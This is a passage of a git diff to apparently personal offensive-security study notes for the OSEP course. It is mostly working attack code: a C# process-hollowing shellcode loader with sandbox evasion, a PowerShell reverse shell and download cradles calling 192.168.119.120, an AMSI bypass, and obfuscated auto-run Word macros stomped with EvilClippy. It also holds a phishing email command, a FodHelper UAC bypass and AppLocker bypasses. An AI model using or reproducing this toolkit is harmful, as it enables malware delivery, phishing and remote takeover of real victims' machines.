+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
+    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
+        uint ProcInfoLen, ref uint retlen);
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
+    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        static void Main(string[] args)
+        {
+            // Check if a URL was provided
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
+                return;
+            }
+
+            string url = "http://" + args[0] + "/" + args[1];
+
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Download the file content as a string directly into memory
+                    string declaration = client.GetStringAsync(url).Result; // Blocking call
+                    declaration = declaration.Trim();
+
+                    // Use a regex to extract the byte values
+                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
+                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
+
+                    if (match.Success)
+                    {
+                        string byteValues = match.Groups[1].Value;
+                        string[] hexArray = byteValues.Split(',');
+
+                        // Create the byte array with the dynamic size based on the number of hex values
+                        byte[] buf = new byte[hexArray.Length];
+
+                        for (int i = 0; i < hexArray.Length; i++)
+                        {
+                            // Convert each hex string to a byte
+                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
+                        }
+
+                        DateTime t1 = DateTime.Now;
+                        Sleep(2000);
+                        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+                        if (t2 < 1.5)
+                        {
+                            return;
+                        }
+
+                        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+                        if (mem == null)
+                        {
+                            return;
+                        }
+
+                        IntPtr flsindex = FlsAlloc(IntPtr.Zero);
+                        if (flsindex == null)
+                        {
+                            return;
+                        }
+
+                        for (int i = 0; i < buf.Length; i++)
+                        {
+                            //buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
+                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                        }
+
+                        STARTUPINFO si = new STARTUPINFO();
+                        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
+                            IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+                        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+                        uint tmp = 0;
+                        IntPtr hProcess = pi.hProcess;
+                        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+                        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+
+                        byte[] addrBuf = new byte[IntPtr.Size];
+                        IntPtr nRead = IntPtr.Zero;
+                        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+                        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                        byte[] data = new byte[0x200];
+                        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+                        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+
+                        uint opthdr = e_lfanew_offset + 0x28;
+
+                        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+
+                        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+                        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+
+                        ResumeThread(pi.hThread);
+                    }
+                    else
+                    {
+                        Console.WriteLine("The file does not contain a valid byte array declaration.");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading file: {ex.Message}");
+            }
         }
     }
 }
@@ -1203,7 +1715,9 @@ End Sub
 ```
 
 ## Stomping On Microsoft Word
+
 ### fakecode.vba
+
 ```VB
 Sub Document_Open()
     MyMacro
@@ -1218,7 +1732,8 @@ Sub MyMacro()
 End Sub
 ```
 
-Automate the VBA Stomping process with Evil Clippy tool
+Automate the VBA Stomping process with Evil Clippy
+
 ```bat
 EvilClippy.exe -s fakecode.vba Doc1.doc
 ```
@@ -1242,7 +1757,9 @@ End Sub
 ```
 
 ### Dechaining with WMI
+
 PowerShell is running as a 64-bit process, => must update the PowerShell shellcode runner script accordingly
+
 ```VB
 Sub Document_Open()
     MyMacro
@@ -1259,6 +1776,7 @@ End Sub
 ```
 
 ### Obfuscating VBA
+
 ```VB
 Sub Document_Open()
     MyMacro
@@ -1277,6 +1795,7 @@ End Sub
 ```
 
 Reduce the number of times StrReverse appears in our code
+
 ```VB
 Sub Document_Open()
     MyMacro
@@ -1303,9 +1822,9 @@ Perform a more complex obfuscation by converting the ASCII string to its decimal
 ```pwsh
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
 
-$payload = "winmgmts:"
+# $payload = "winmgmts:"
 
-$payload = "Win32_Process"
+# $payload = "Win32_Process"
 
 [string]$output = ""
 
@@ -1371,13 +1890,156 @@ End Function
 When most antivirus products emulate the execution of a document, they rename it. During execution, we check the name of the document and if we find that it is not the same as the one we originally provided, we can assume the execution has been emulated and we can exit the code
 
 Generates a Meterpreter reverse shell as long as our file is named runner.doc
+
 ```VB
 If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
     Exit Function
 End If
 ```
 
+## Creating Malicious Macro for OSEP
+
+`run0.txt`
+
+```pwsh
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+$client = New-Object System.Net.Sockets.TCPClient('192.168.119.120',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+### Invoke-Obfuscation
+
+```
+Import-Module ./Invoke-Obfuscation/
+Invoke-Obfuscation
+Invoke-Obfuscation> set scriptpath run0.txt
+Invoke-Obfuscation> TOKEN
+Invoke-Obfuscation\Token> ALL
+Invoke-Obfuscation\Token\All> 1
+```
+
+Store the output in `run.txt`
+
+### Base64 Encode Powershell Command
+
+```pwsh
+$Text = 'iex((new-object system.net.webclient).downloadstring("http://192.168.119.120/run.txt"))'                                                               
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                    
+
+$EncodedText = [Convert]::ToBase64String($Bytes)                            
+
+$EncodedText
+```
+
+### Obfustcate VBA
+
+```pwsh
+$payload = "powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
+
+# $payload = "winmgmts:"
+
+# $payload = "Win32_Process"
+
+# $payload = "Report.doc"
+
+[string]$output = ""
+
+$payload.ToCharArray() | %{
+    [string]$thischar = [byte][char]$_ + 19
+    if($thischar.Length -eq 1)
+    {
+        $thischar = [string]"00" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 2)
+    {
+        $thischar = [string]"0" + $thischar
+        $output += $thischar
+    }
+    elseif($thischar.Length -eq 3)
+    {
+        $output += $thischar
+    }
+}
+$output | clip
+```
+
+### Macro in Report0.doc
+
+```VB
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+
+Function Pears(Beets)
+    Pears = Chr(Beets - 19)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Do
+    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+    Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+
+Function MyMacro()
+    If ActiveDocument.Name <> Nuts("clipboard3") Then
+        Exit Function
+    End If
+
+    Dim Apples As String
+    Dim Water As String
+    Dim t1 As Date
+    Dim t2 As Date
+    Dim time As Long
+
+    t1 = Now()
+    Sleep (3000)
+    t2 = Now()
+    time = DateDiff("s", t1, t2)
+
+    If time < 3 Then
+        Exit Function
+    End If
+    
+    Apples = "clipboard"
+    Water = Nuts(Apples)
+    GetObject(Nuts("clipboard1")).Get(Nuts("clipboard2")).Create Water, Tea, Coffee, Napkin
+End Function
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+```
+
+### Stomp Microsoft Word document
+
+```bat
+.\EvilClippy.exe -s fakecode.vba Report0.doc
+ren Report0_EvilClippy.doc Report.doc
+```
+
+### Send email
+
+```bash
+sendEmail -f <email>  -t <email> -u “Report to Review” -m “Please review this report” -s 192.168.119.120 -a Report.doc
+```
+
 ## Bypassing AMSI With Reflection in PowerShell
+
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
@@ -1387,6 +2049,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 ```
 
 ## Wrecking AMSI in PowerShell
+
 ```pwsh
 function LookupFunc {
 
@@ -1438,6 +2101,7 @@ $vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
 ## FodHelper UAC Bypass
 
 ### run4.txt
+
 ```pwsh
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 
@@ -1490,7 +2154,7 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 ```
 
 ```bash
-msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.119.120;set LPORT 443;set EnableStageEncoding true;set StageEncoder encoder/x64/zutto_dekiru;run;"
 ```
 
 ```pwsh
@@ -1502,6 +2166,7 @@ C:\Windows\System32\fodhelper.exe
 ```
 
 ### Metasploit UAC bypass module
+
 ```
 use exploit/windows/local/bypassuac_fodhelper
 show targets
@@ -1515,7 +2180,9 @@ exploit
 ```
 
 ## Bypassing AMSI in JScript
+
 ### Registry Key
+
 Prepend below code to the DotNetToJscript-generated shellcode runner to bypass AMSI and generate a reverse shell.
 ```js
 var sh = new ActiveXObject('WScript.Shell');
@@ -1533,7 +2200,8 @@ try{
 }
 ```
 
-### Rename wscript.exe to amsi.dll and executing it.
+### Rename wscript.exe to amsi.dll and executing it
+
 Prepend below code to the DotNetToJscript-generated shellcode runner 
 ```js
 var filesys= new ActiveXObject("Scripting.FileSystemObject");
@@ -1558,6 +2226,7 @@ catch(e)
 ## Basic Bypasses
 
 ### Trusted Folders
+
 ```bat
 accesschk.exe "student" C:\Windows -wus
 
@@ -1565,6 +2234,7 @@ icacls.exe C:\Windows\Tasks
 ```
 
 ### Bypass With DLLs
+
 ```bat
 rundll32 C:\Tools\TestDll.dll,run
 ```
@@ -1616,6 +2286,7 @@ wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 ```
 
 ### Third Party Execution
+
 ```bat
 python test.py
 ```
@@ -1857,3 +2528,4 @@ wmic process get brief /format:"http://192.168.119.120/test.xsl"
 ```
 
 # Bypassing Network Filters
+
